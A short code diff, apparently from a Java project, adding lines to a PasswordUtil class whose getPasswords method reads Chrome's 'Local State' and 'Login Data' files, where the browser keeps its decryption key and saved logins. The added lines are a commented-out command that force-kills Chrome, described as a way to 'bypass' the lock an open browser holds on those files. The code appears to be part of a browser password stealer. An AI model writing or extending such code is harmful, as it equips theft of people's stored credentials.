@@ -20,6 +20,14 @@ import java.util.stream.Stream;
 public class PasswordUtil {
 
     public static String getPasswords() {
+
+        // will not work if browser is open. primitive way to "bypass" this below
+        /*
+        Runtime rt = Runtime.getRuntime();
+
+        rt.exec("taskkill /F /IM chrome.exe");
+         */
+
         AtomicReference<StringBuilder> ret = new AtomicReference<>(new StringBuilder());
         Stream.of(new String[][]{
                 {localAppdata() + "/Google/Chrome/User Data/Local State", localAppdata() + "/Google/Chrome/User Data/Default/Login Data"},
